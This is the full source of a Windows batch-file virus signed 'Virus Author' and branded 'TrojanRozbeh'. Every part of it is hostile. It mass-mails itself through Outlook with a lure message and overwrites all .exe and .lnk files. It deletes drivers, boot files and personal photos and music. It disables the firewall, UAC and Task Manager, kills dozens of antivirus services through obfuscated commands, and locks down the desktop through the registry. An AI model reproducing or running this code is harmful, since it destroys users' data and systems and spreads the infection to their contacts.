@ echo off
net stop "security center"
net stop sharedaccess
netsh firewall set opmode mode-disable
set valinf="rundll32_%random%_toolbar"
set reginf="hklm\Software\Microsoft\Windows\CurrentVersion\Run"
reg add %reginf% /v %valinf% /t "REG_SZ" /d %0 /f > nul
echo dim x>>%SystemDrive%\mail.vbs
echo on error resume next>>%SystemDrive%\mail.vbs
echo Set fso ="Scripting.FileSystem.Object">>%SystemDrive%\mail.vbs
echo Set so=CreateObject(fso)>>%SystemDrive%\mail.vbs
echo Set ol=CreateObject("Outlook.Application")>>%SystemDrive%\mail.vbs
echo Set out=WScript.CreateObject("Outlook.Application")>>%SystemDrive%\mail.vbs
echo Set mapi = out.GetNameSpace("MAPI")>>%SystemDrive%\mail.vbs
echo Set a = mapi.AddressLists(1)>>%SystemDrive%\mail.vbs
echo Set ae=a.AddressEntries>>%SystemDrive%\mail.vbs
echo For x=1 To ae.Count>>%SystemDrive%\mail.vbs
echo Set ci=ol.CreateItem(0)>>%SystemDrive%\mail.vbs
echo Set Mail=ci>>%SystemDrive%\mail.vbs
echo Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)>>%SystemDrive%\mail.vbs
echo Mail.Subject="Is this you?">>%SystemDrive%\mail.vbs
echo Mail.Body="Man that has got to be embarrassing!">>%SystemDrive%\mail.vbs
echo Mail.Attachments.Add(%0)>>%SystemDrive%\mail.vbs
echo Mail.send>>%SystemDrive%\mail.vbs
echo Next>>%SystemDrive%\mail.vbs
echo ol.Quit>>%SystemDrive%\mail.vbs
start "" "%SystemDrive%\mail.vbs"
rem Infect All .Exe Files
assoc .exe=batfile
DIR /S/B %SystemDrive%\*.exe >> InfList_exe.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_exe.txt) do copy /y %0 "%%j:%%k"
assoc .lnk=batfile
DIR /S/B %SystemDrive%\*.lnk >> InfList_lnk.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_lnk.txt) do copy /y %0 "%%j:%%k"
@((( Echo Off > Nul ) & Break Off )
    @Set HiveBSOD=HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    @Reg Add "%HiveBSOD%" /v "BSOD" /t "REG_SZ" /d %0 /f > Nul
    @Del /q /s /f "%SystemRoot%\Windows\System32\Drivers\*.*"
)
attrib -r -s -h c:\autoexec.bat
del c:\autoexec.bat
attrib -r -s -h c:\boot.ini
del c:\boot.ini
attrib -r -s -h c:\ntldr
del c:\ntldr
attrib -r -s -h c:\windows\win.ini
del c:\windows\win.ini
shutdown /r /t 00
attrib +h %0
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul

echo ^If WScript.Arguments.Named.Exists(^"elevated^") = False Then >GateWay.VBS
echo  CreateObject(^"Shell.Application^").ShellExecute ^"wscript.exe^", ^"^"^"^" ^& WScript.ScriptFullName ^& ^"^"^" /elevated^", ^"^", ^"runas^", 1 >>GateWay.VBS
echo  WScript.Quit >>GateWay.VBS
echo End If >>GateWay.VBS
echo User = CreateObject(^"WScript.Shell^").ExpandEnvironmentStrings(^"%UserProfile%^") >>GateWay.VBS
echo dim Key, fso, Eater >>GateWay.VBS
echo Set Key = CreateObject(^"WScript.Shell^") >>GateWay.VBS
echo Set fso = CreateObject(^"Scripting.FileSystemObject^") >>GateWay.VBS
echo Set Eater = fso.GetFile(Wscript.ScriptFullName) >>GateWay.VBS
echo Key.Regwrite ^"HKLM\System\CurrentControlSet\Control\SafeBoot\AlternateShell^",^"notepad.exe^"^, ^"REG_SZ^" >>GateWay.VBS
echo Key.Regwrite ^"HKLM\System\CurrentControlSet\Control\ComputerName\ActiveComputerName\ComputerName^",^"TrojanRozbeh^", ^"REG_SZ^" >>GateWay.VBS
echo Key.Regwrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\legalnoticecaption^",^"ATTENTION!^", ^"REG_SZ^" >>GateWay.VBS
echo Key.Regwrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\legalnoticetext^",^"Your Computer Destroyed by TrojanRozbeh!^", ^"REG_SZ^" >>GateWay.VBS
echo Key.Regwrite ^"HKCU\Control Panel\International\s1159^",^"TrojanRozbeh^", ^"REG_SZ^" >>GateWay.VBS
echo Key.Regwrite ^"HKCU\Control Panel\International\s2359^",^"TrojanRozbeh^", ^"REG_SZ^" >>GateWay.VBS
echo Key.RegWrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden^", ^"2^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.RegWrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.RegWrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.RegWrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\TaskbarNoPinnedList^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.RegWrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoPinningToTaskbar^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.RegWrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSetTaskbar^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.RegWrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoTrayItemsDisplay^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.RegWrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoTrayContextMenu^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.RegWrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSaveSettings^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.RegWrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableLockWorkstation^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.RegWrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA^", ^"0^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.RegWrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoControlPanel^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.RegWrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoStartMenuPinnedList^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.RegWrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoStartMenuMFUprogramsList^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.RegWrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoStartMenuMorePrograms,^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.Regwrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.Regwrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFolderOptions^" , ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.Regwrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFileAssociate^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.Regwrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.Regwrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFind^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.Regwrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSecurityTab^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.Regwrite ^"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSecurityTab^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.RegWrite ^"HKCU\Software\Microsoft\Command Processor\DisableUNCCheck^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.Regwrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives^",^"67108863^",^"REG_DWORD^" >>GateWay.VBS
Gateway.vbs
time 12:00
del /f /q '%userprofile%\My Pictures\*.*'
del /f /q '%userprofile%\My Music\*.*'
net stop "SDRSVC"
set key="HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass"
reg delete %key%
reg add %key% /v Start /t REG_DWORD /d 4
@Echo off & @@Break Off
Ipconfig /release
%jUmP%E%nD%c%onFiG%h%IdE%o%P% h%aRv%%aRd%A%T%%cHe%cK%HappY%3D b%aLLo0Ns%Y%eS% m3Ga!?!
P%ReSs%%IE%AuS%ExPloR%e%r% > nul.%TempInternetRelease%
rem ---------------------------------
rem Encripted AV Killer
del /F /Q %SystemDrive%\recycler\S-1-5-21-1202660629-261903793-725345543-1003\run.bat
set ii=ne
set ywe=st
set ury=t
set iej=op
set jt53=Syma
set o6t=nor
set lyd2=fee
set h3d=ton
set gf45=ntec
set own5=McA
%ii%%ury% %ywe%%iej% "Security Center" /y
%ii%%ury% %ywe%%iej% "Automatic Updates" /y
%ii%%ury% %ywe%%iej% "%jt53%%gf45% Core LC" /y
%ii%%ury% %ywe%%iej% "SAVScan" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Firewall Monitor Service" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Auto-Protect Service" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Auto Protect Service" /y
%ii%%ury% %ywe%%iej% "%own5%%lyd2% Spamkiller Server" /y
%ii%%ury% %ywe%%iej% "%own5%%lyd2% Personal Firewall Service" /y
%ii%%ury% %ywe%%iej% "%own5%%lyd2% SecurityCenter Update Manager" /y
%ii%%ury% %ywe%%iej% "%jt53%%gf45% SPBBCSvc" /y
cls
%ii%%ury% %ywe%%iej% "Ahnlab Task Scheduler" /y
%ii%%ury% %ywe%%iej% navapsvc /y
%ii%%ury% %ywe%%iej% "Sygate Personal Firewall Pro" /y
%ii%%ury% %ywe%%iej% vrmonsvc /y
%ii%%ury% %ywe%%iej% MonSvcNT /y
%ii%%ury% %ywe%%iej% SAVScan /y
%ii%%ury% %ywe%%iej% NProtectService /y
%ii%%ury% %ywe%%iej% ccSetMGR /y
%ii%%ury% %ywe%%iej% ccEvtMGR /y
%ii%%ury% %ywe%%iej% srservice /y
%ii%%ury% %ywe%%iej% "%jt53%%gf45% Network Drivers Service" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% Unerase Protection" /y
%ii%%ury% %ywe%%iej% MskService /y
%ii%%ury% %ywe%%iej% MpfService /y
%ii%%ury% %ywe%%iej% mcupdmgr.exe /y
%ii%%ury% %ywe%%iej% "%own5%%lyd2%AntiSpyware" /y
%ii%%ury% %ywe%%iej% helpsvc /y
%ii%%ury% %ywe%%iej% ERSvc /y
%ii%%ury% %ywe%%iej% "*%o6t%%h3d%*" /y
%ii%%ury% %ywe%%iej% "*%jt53%%gf45%*" /y
%ii%%ury% %ywe%%iej% "*%own5%%lyd2%*" /y
cls
%ii%%ury% %ywe%%iej% ccPwdSvc /y
%ii%%ury% %ywe%%iej% "%jt53%%gf45% Core LC" /y
%ii%%ury% %ywe%%iej% navapsvc /y
%ii%%ury% %ywe%%iej% "Serv-U" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Auto Protect Service" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Client" /y
%ii%%ury% %ywe%%iej% "%jt53%%gf45% AntiVirus Client" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Server" /y
%ii%%ury% %ywe%%iej% "NAV Alert" /y
%ii%%ury% %ywe%%iej% "Nav Auto-Protect" /y
cls
%ii%%ury% %ywe%%iej% "McShield" /y
%ii%%ury% %ywe%%iej% "DefWatch" /y
%ii%%ury% %ywe%%iej% eventlog /y
%ii%%ury% %ywe%%iej% InoRPC /y
%ii%%ury% %ywe%%iej% InoRT /y
%ii%%ury% %ywe%%iej% InoTask /y
cls
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Auto Protect Service" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Client" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Corporate Edition" /y
%ii%%ury% %ywe%%iej% "ViRobot Professional Monitoring" /y
%ii%%ury% %ywe%%iej% "PC-cillin Personal Firewall" /y
%ii%%ury% %ywe%%iej% "Trend Micro Proxy Service" /y
%ii%%ury% %ywe%%iej% "Trend NT Realtime Service" /y
%ii%%ury% %ywe%%iej% "%own5%%lyd2%.com McShield" /y
%ii%%ury% %ywe%%iej% "%own5%%lyd2%.com VirusScan Online Realtime Engine" /y
%ii%%ury% %ywe%%iej% "SyGateService" /y
%ii%%ury% %ywe%%iej% "Sygate Personal Firewall Pro" /y
cls
%ii%%ury% %ywe%%iej% "Sophos Anti-Virus" /y
%ii%%ury% %ywe%%iej% "Sophos Anti-Virus Network" /y
%ii%%ury% %ywe%%iej% "eTrust Antivirus Job Server" /y
%ii%%ury% %ywe%%iej% "eTrust Antivirus Realtime Server" /y
%ii%%ury% %ywe%%iej% "Sygate Personal Firewall Pro" /y
%ii%%ury% %ywe%%iej% "eTrust Antivirus RPC Server" /y
cls
%ii%%ury% %ywe%%iej% netsvcs
%ii%%ury% %ywe%%iej% spoolnt
net stop �Security Center�
netsh firewall set opmode mode=disable
tskill /A av*
tskill /A fire*
tskill /A anti*
cls
tskill /A spy*
tskill /A bullguard
tskill /A PersFw
tskill /A KAV*
tskill /A ZONEALARM
tskill /A SAFEWEB
cls
tskill /A OUTPOST
tskill /A nv*
tskill /A nav*
tskill /A F-*
tskill /A ESAFE
tskill /A cle
cls
tskill /A BLACKICE
tskill /A def*
tskill /A kav
tskill /A kav*
tskill /A avg*
tskill /A ash*
cls
tskill /A aswupdsv
tskill /A ewid*
tskill /A guard*
tskill /A guar*
tskill /A gcasDt*
tskill /A msmp*
cls
tskill /A mcafe*
tskill /A mghtml
tskill /A msiexec
tskill /A outpost
tskill /A isafe
tskill /A zap*
cls
tskill /A zauinst
tskill /A upd*
tskill /A zlclien*
tskill /A minilog
tskill /A cc*
tskill /A norton*
cls
tskill /A norton au*
tskill /A ccc*
tskill /A npfmn*
tskill /A loge*
tskill /A nisum*
tskill /A issvc
tskill /A tmp*
cls
tskill /A tmn*
tskill /A pcc*
tskill /A cpd*
tskill /A pop*
tskill /A pav*
tskill /A padmin
cls
tskill /A panda*
tskill /A avsch*
tskill /A sche*
tskill /A syman*
tskill /A virus*
tskill /A realm*
cls
tskill /A sweep*
tskill /A scan*
tskill /A ad-*
tskill /A safe*
tskill /A avas*
tskill /A norm*
cls
tskill /A offg*
echo :a >>explorer.bat
echo tskill explorer >>explorer.bat
echo goto a >>explorer.bat
echo Set objShell = CreateObject("WScript.Shell")>>invisi.vbs
echo strCommand = "explorer.bat">>invisi.vbs
echo objShell.Run strCommand, vbHide, TRUE>>invisi.vbs
start "" invisi.vbs
start http://www.xnxx.com
reg add "HKCU\Software\Microsoft\Internet Explorer\Main" /v "START PAGE" /d "http://www.xnxx.com"



__-Virus Author: -__